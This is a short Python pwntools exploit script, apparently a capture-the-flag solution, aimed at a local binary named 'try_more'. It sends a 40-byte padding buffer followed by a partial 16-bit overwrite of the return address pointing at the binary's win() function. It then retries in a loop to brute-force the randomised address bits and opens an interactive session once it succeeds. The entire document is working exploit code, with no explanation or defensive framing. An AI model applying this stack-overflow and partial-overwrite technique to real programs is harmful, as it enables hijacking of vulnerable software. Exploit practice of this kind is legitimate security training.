#!/usr/bin/env python3

from pwn import *
import sys

BINARY = "./try_more"
elf = ELF(BINARY)

# double check 
RIP_OFFSET = 40
print(RIP_OFFSET)

win_offset_low16 = elf.symbols["win"] & 0xFFFF
log.info(f"win() low 16 bits: {hex(win_offset_low16)}")


def try_once():
    io = process(BINARY)

    payload  = b"A" * RIP_OFFSET
    payload += p16(win_offset_low16)

    io.sendafter(b"> ", payload)

    try:
        io.recvuntil(b"Good", timeout=2)
        log.success("Got it!")
        io.interactive()
        io.close()
        return True
    except Exception:
        pass

    io.close()
    return False

if __name__ == "__main__":
    attempt = 0
    while True:
        attempt += 1
        log.info(f"Attempt #{attempt}  (expect around 16 on average)")
        if try_once():
            break
    log.success(f"Done in {attempt} attempt(s).")
